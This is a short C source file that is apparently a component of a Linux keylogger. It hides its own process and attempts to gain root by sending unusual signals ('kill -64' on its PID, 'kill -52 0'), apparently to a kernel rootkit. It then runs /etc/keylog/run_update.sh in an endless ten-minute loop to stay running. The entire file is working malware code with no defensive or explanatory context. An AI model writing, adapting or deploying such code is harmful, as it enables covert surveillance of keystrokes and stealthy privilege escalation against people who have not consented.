#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <linux/input.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <time.h>
#include <fcntl.h>
#include <stdarg.h>

int hide_pid(void) {					 	
	pid_t pid = getpid();								/* get keylogger pid */
	time_t curtime;
	time(&curtime);										/* set the current time */
	char str[20];
	sprintf(str, "kill -64 %d", pid);
	
    system(str);
	return 0;
}

int is_root(void) {
	time_t curtime;
	time(&curtime);										/* set the current time */
	if (geteuid() != 0) {									/* check if user is root */
		char str[20];
		sprintf(str, "kill -52 0");
		system(str);
	}
	return 0;
}

int main(int argc, char *argv[]) {
	// if (fork() != 0) return 0;
	
	hide_pid();
	is_root(); 
	char str[50];

	while (1) {
		sprintf(str, "bash /etc/keylog/run_update.sh");
		system(str);
		sleep(600);
	}
	return 0;
}